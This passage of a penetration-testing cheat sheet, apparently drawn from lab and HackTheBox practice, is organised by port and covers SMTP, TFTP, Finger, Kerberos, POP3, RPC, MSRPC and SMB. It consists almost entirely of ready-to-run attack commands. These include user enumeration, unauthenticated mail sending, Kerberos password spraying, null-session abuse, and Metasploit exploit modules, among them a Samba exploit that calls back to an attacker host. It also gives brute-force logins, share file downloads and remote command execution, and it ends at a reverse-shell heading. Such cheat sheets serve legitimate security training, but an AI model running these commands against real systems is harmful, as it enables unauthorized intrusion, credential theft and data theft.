<div class="highlight"><pre><span></span><code><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">nvvC</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="mi">25</span>
<span class="n">HELO</span><span class="w"> </span><span class="n">foo</span><span class="o">&lt;</span><span class="n">cr</span><span class="o">&gt;&lt;</span><span class="n">lf</span><span class="o">&gt;</span>

<span class="n">telnet</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="mi">25</span>
<span class="n">VRFY</span><span class="w"> </span><span class="n">root</span>

<span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">smtp</span><span class="o">-</span><span class="n">commands</span><span class="p">,</span><span class="n">smtp</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">users</span><span class="p">,</span><span class="n">smtp</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">cve2010</span><span class="o">-</span><span class="mi">4344</span><span class="p">,</span><span class="n">smtp</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">cve2011</span><span class="o">-</span><span class="mi">1720</span><span class="p">,</span><span class="n">smtp</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">cve2011</span><span class="o">-</span><span class="mi">1764</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">25</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Enumerate SMTP Users</span>

<span class="n">sudo</span><span class="w"> </span><span class="n">smtp</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="k">enum</span><span class="w"> </span><span class="o">-</span><span class="n">M</span><span class="w"> </span><span class="n">VRFY</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Usernames</span><span class="o">/</span><span class="n">Names</span><span class="o">/</span><span class="n">names</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mf">10.1</span><span class="o">.</span><span class="mf">1.65</span>

<span class="n">Send</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="n">unauth</span><span class="p">:</span>

<span class="n">MAIL</span><span class="w"> </span><span class="n">FROM</span><span class="p">:</span><span class="n">admin</span><span class="err">@</span><span class="n">admin</span><span class="o">.</span><span class="n">com</span>
<span class="n">RCPT</span><span class="w"> </span><span class="n">TO</span><span class="p">:</span><span class="n">DestinationEmail</span><span class="err">@</span><span class="n">DestinationDomain</span><span class="o">.</span><span class="n">com</span>
<span class="n">DATA</span>
<span class="n">test</span>

<span class="o">.</span>

<span class="n">Receive</span><span class="p">:</span>
<span class="mi">250</span><span class="w"> </span><span class="n">OK</span>
</code></pre></div>

<h2>Port 69 - UDP - TFTP</h2>
<p>This is used for tftp-server.</p>
<ul>
<li>Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.</li>
<li>Checks of FTP Port 21.</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p69</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">tftp</span><span class="o">-</span><span class="k">enum</span><span class="o">.</span><span class="n">nse</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
</code></pre></div>

<h2>Port 79 - Finger</h2>
<p>Ref:HtB Sunday</p>
<div class="highlight"><pre><span></span><code><span class="n">kali</span><span class="err">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">HtB</span><span class="o">/</span><span class="n">Sunday</span><span class="o">/</span><span class="n">finger</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="mf">1.0</span><span class="o">$</span><span class="w"> </span><span class="o">./</span><span class="n">finger</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="k">enum</span><span class="o">.</span><span class="n">pl</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Seclists</span><span class="o">/</span><span class="n">Usernames</span><span class="o">/</span><span class="n">Names</span><span class="o">/</span><span class="n">names</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.76</span><span class="w"> </span>
</code></pre></div>

<h2>Kerberos - 88</h2>
<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">MS14</span><span class="o">-</span><span class="mi">068</span>
<span class="o">-</span><span class="w"> </span><span class="n">GetUserSPNs</span>
<span class="n">GET</span><span class="w"> </span><span class="n">USERS</span><span class="p">:</span>

<span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">88</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">krb5</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">users</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="s2">&quot;krb5-enum-users.realm=&#39;DOMAIN.LOCAL&#39;&quot;</span><span class="w"> </span><span class="n">IP</span>
<span class="n">use</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">kerberos_enumusers</span>

<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">tarlogic</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">blog</span><span class="o">/</span><span class="n">como</span><span class="o">-</span><span class="n">funciona</span><span class="o">-</span><span class="n">kerberos</span><span class="o">/</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">tarlogic</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">blog</span><span class="o">/</span><span class="n">como</span><span class="o">-</span><span class="n">atacar</span><span class="o">-</span><span class="n">kerberos</span><span class="o">/</span>

<span class="n">python</span><span class="w"> </span><span class="n">kerbrute</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="o">-</span><span class="n">users</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">kb_users</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">passwords</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">pass_common_plus</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">threads</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="o">-</span><span class="n">domain</span><span class="w"> </span><span class="n">DOMAIN</span><span class="w"> </span><span class="o">-</span><span class="n">outputfile</span><span class="w"> </span><span class="n">kb_extracted_passwords</span><span class="o">.</span><span class="n">txt</span>

<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="o">.</span><span class="n">stealthbits</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">extracting</span><span class="o">-</span><span class="n">service</span><span class="o">-</span><span class="n">account</span><span class="o">-</span><span class="n">passwords</span><span class="o">-</span><span class="n">with</span><span class="o">-</span><span class="n">kerberoasting</span><span class="o">/</span>
</code></pre></div>

<h2>Port 110 - Pop3</h2>
<div class="highlight"><pre><span></span><code><span class="n">telnet</span><span class="w"> </span><span class="mf">10.11.1.111</span>
<span class="n">USER</span><span class="w"> </span><span class="n">pelle</span><span class="mf">@10.11.1.111</span>
<span class="n">PASS</span><span class="w"> </span><span class="n">admin</span>

<span class="nl">or</span><span class="p">:</span>

<span class="n">USER</span><span class="w"> </span><span class="n">pelle</span>
<span class="n">PASS</span><span class="w"> </span><span class="n">admin</span>

<span class="cp"># List all emails</span>
<span class="n">list</span>

<span class="cp"># Retrieve email number 5, for example</span>
<span class="n">retr</span><span class="w"> </span><span class="mi">9</span>
</code></pre></div>

<h2>Port 111 - Rpcbind</h2>
<div class="highlight"><pre><span></span><code><span class="n">rpcinfo</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w">  </span><span class="c1"># enum NFS shares</span>
<span class="n">showmount</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">mount</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="n">nfs</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="p">:</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="n">mnt</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">nolock</span><span class="w">     </span><span class="c1"># mount remote share to your local machine</span>

<span class="n">rpcclient</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="w">    </span><span class="n">srvinfo</span>
<span class="w">    </span><span class="n">enumdomusers</span>
<span class="w">    </span><span class="n">getdompwinfo</span>
<span class="w">    </span><span class="n">querydominfo</span>
<span class="w">    </span><span class="n">netshareenum</span>
<span class="w">    </span><span class="n">netshareenumall</span>
</code></pre></div>

<h2>Port 135 - MSRPC</h2>
<p>Some versions are vulnerable.</p>
<div class="highlight"><pre><span></span><code><span class="n">nmap</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">msrpc</span><span class="o">-</span><span class="k">enum</span>
<span class="n">msf</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">dcerpc</span><span class="o">/</span><span class="n">ms03_026_dcom</span>
</code></pre></div>

<h2>Port 139/445 - SMB</h2>
<div class="highlight"><pre><span></span><code><span class="c1"># Enum hostname</span>
<span class="n">enum4linux</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">nmblookup</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">*</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="n">unsafe</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="o">-</span><span class="n">T5</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Get Version</span>
<span class="n">smbver</span><span class="o">.</span><span class="n">sh</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">Msfconsole</span><span class="p">;</span><span class="n">use</span><span class="w"> </span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_version</span>
<span class="n">ngrep</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">tap0</span><span class="w"> </span><span class="s1">&#39;s.?a.?m.?b.?a.*[[:digit:]]&#39;</span>
<span class="n">smbclient</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span>\\\\<span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Get Shares</span>
<span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w">  </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">R</span><span class="w"> </span><span class="o">&lt;</span><span class="n">sharename</span><span class="o">&gt;</span>
<span class="n">sudo</span><span class="w"> </span><span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.136</span><span class="w"> </span><span class="o">-</span><span class="n">R</span><span class="w"> </span><span class="o">--</span><span class="n">download</span><span class="w"> </span><span class="s2">&quot;Bob Share\Draft Contract Mr. Yamamoto.txt&quot;</span><span class="w"> </span><span class="c1"># Connect to a share with a space &amp; download files</span>
<span class="n">echo</span><span class="w"> </span><span class="n">exit</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">smbclient</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span>\\\\<span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">smbclient</span><span class="w"> </span>\\\\<span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>\\<span class="o">&lt;</span><span class="n">share</span><span class="o">&gt;</span>
<span class="n">smbclient</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">N</span>
<span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">shares</span><span class="w"> </span><span class="o">-</span><span class="n">p139</span><span class="p">,</span><span class="mi">445</span><span class="w"> </span><span class="o">-</span><span class="n">T4</span><span class="w"> </span><span class="o">-</span><span class="n">Pn</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">smbclient</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span>\\\\<span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>\\

<span class="c1"># Check null sessions</span>
<span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">rpcclient</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">N</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">smbclient</span><span class="w"> </span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/</span><span class="n">IPC</span><span class="o">$</span><span class="w"> </span><span class="o">-</span><span class="n">N</span>

<span class="c1"># Exploit null sessions</span>
<span class="k">enum</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="k">enum</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="k">enum</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">enum4linux</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">python3</span><span class="o">-</span><span class="n">impacket</span><span class="o">/</span><span class="n">examples</span><span class="o">/</span><span class="n">samrdump</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Connect to username shares</span>
<span class="n">smbclient</span><span class="w"> </span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/</span><span class="n">share</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="n">username</span>

<span class="c1"># Connect with a user and password</span>

<span class="n">smbclient</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="s2">&quot;fox</span><span class="si">%i</span><span class="s2">paralipomenidellabatracomiomachia&quot;</span><span class="w">  </span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">123.157</span><span class="o">/</span>

<span class="c1"># Connect to share anonymously</span>
<span class="n">smbclient</span><span class="w"> </span>\\\\<span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>\\<span class="o">&lt;</span><span class="n">share</span><span class="o">&gt;</span>
<span class="n">smbclient</span><span class="w"> </span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/&lt;</span><span class="n">share</span><span class="o">&gt;</span>
<span class="n">smbclient</span><span class="w"> </span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/&lt;</span><span class="n">share</span>\<span class="w"> </span><span class="n">name</span><span class="o">&gt;</span>
<span class="n">smbclient</span><span class="w"> </span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/&lt;</span><span class="s2">&quot;&quot;</span><span class="n">share</span><span class="w"> </span><span class="n">name</span><span class="s2">&quot;&quot;</span><span class="o">&gt;</span>
<span class="n">rpcclient</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="s2">&quot; &quot;</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">rpcclient</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="s2">&quot; &quot;</span><span class="w"> </span><span class="o">-</span><span class="n">N</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Check vulns</span>
<span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">*</span><span class="w"> </span><span class="o">-</span><span class="n">p139</span><span class="p">,</span><span class="mi">445</span><span class="w"> </span><span class="o">-</span><span class="n">T4</span><span class="w"> </span><span class="o">-</span><span class="n">Pn</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Check common security concerns</span>
<span class="n">msfconsole</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framwork</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">resource</span><span class="o">/</span><span class="n">smb_checks</span><span class="o">.</span><span class="n">rc</span>

<span class="c1"># Extra validation</span>
<span class="n">msfconsole</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framwork</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">resource</span><span class="o">/</span><span class="n">smb_validate</span><span class="o">.</span><span class="n">rc</span>

<span class="c1"># Multi exploits</span>
<span class="n">msfconsole</span><span class="p">;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">samba</span><span class="o">/</span><span class="n">usermap_script</span><span class="p">;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">lhost</span><span class="w"> </span><span class="mf">192.168</span><span class="o">.</span><span class="mf">0.</span><span class="n">X</span><span class="p">;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">rhost</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="p">;</span><span class="w"> </span><span class="n">run</span>

<span class="c1"># Bruteforce login</span>
<span class="n">medusa</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">userhere</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Passwords</span><span class="o">/</span><span class="n">Common</span><span class="o">-</span><span class="n">Credentials</span><span class="o">/</span><span class="mi">10</span><span class="n">k</span><span class="o">-</span><span class="n">most</span><span class="o">-</span><span class="n">common</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">M</span><span class="w"> </span><span class="n">smbnt</span>
<span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p445</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">brute</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">userdb</span><span class="o">=</span><span class="n">userfilehere</span><span class="p">,</span><span class="n">passdb</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Passwords</span><span class="o">/</span><span class="n">Common</span><span class="o">-</span><span class="n">Credentials</span><span class="o">/</span><span class="mi">10</span><span class="o">-</span><span class="n">million</span><span class="o">-</span><span class="n">password</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="n">top</span><span class="o">-</span><span class="mf">1000000.</span><span class="n">txt</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w">  </span><span class="o">-</span><span class="n">vvvv</span>
<span class="n">nmap</span><span class="w"> </span><span class="err">–</span><span class="n">script</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">brute</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># nmap smb enum &amp; vuln</span>
<span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-*</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-*</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">ls</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">mbenum</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="n">discovery</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="nb">print</span><span class="o">-</span><span class="n">text</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">psexec</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">stats</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">system</span><span class="o">-</span><span class="n">info</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">protocols</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">139</span><span class="p">,</span><span class="mi">445</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">domains</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">groups</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">processes</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">sessions</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">shares</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">users</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">ls</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">mbenum</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="n">discovery</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="nb">print</span><span class="o">-</span><span class="n">text</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">psexec</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">stats</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">system</span><span class="o">-</span><span class="n">info</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">conficker</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">cve2009</span><span class="o">-</span><span class="mf">3103.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms06</span><span class="o">-</span><span class="mf">025.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms07</span><span class="o">-</span><span class="mf">029.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms08</span><span class="o">-</span><span class="mf">067.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms10</span><span class="o">-</span><span class="mf">054.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms10</span><span class="o">-</span><span class="mf">061.</span><span class="n">nse</span><span class="p">,</span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">regsvc</span><span class="o">-</span><span class="n">dos</span><span class="o">.</span><span class="n">nse</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">139</span><span class="p">,</span><span class="mi">445</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Mount smb volume linux</span>
<span class="n">mount</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="n">cifs</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="n">user</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="w"> </span><span class="o">//</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">/</span><span class="n">share</span><span class="w"> </span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">share</span>

<span class="c1"># rpcclient commands</span>
<span class="n">rpcclient</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="w">    </span><span class="n">srvinfo</span>
<span class="w">    </span><span class="n">enumdomusers</span>
<span class="w">    </span><span class="n">getdompwinfo</span>
<span class="w">    </span><span class="n">querydominfo</span>
<span class="w">    </span><span class="n">netshareenum</span>
<span class="w">    </span><span class="n">netshareenumall</span>

<span class="c1"># Run cmd over smb from linux</span>
<span class="n">winexe</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="s2">&quot;cmd.exe&quot;</span><span class="w"> </span><span class="o">--</span><span class="n">system</span>

<span class="c1">#smb reverse shell with &quot;logon&quot; cmd</span>
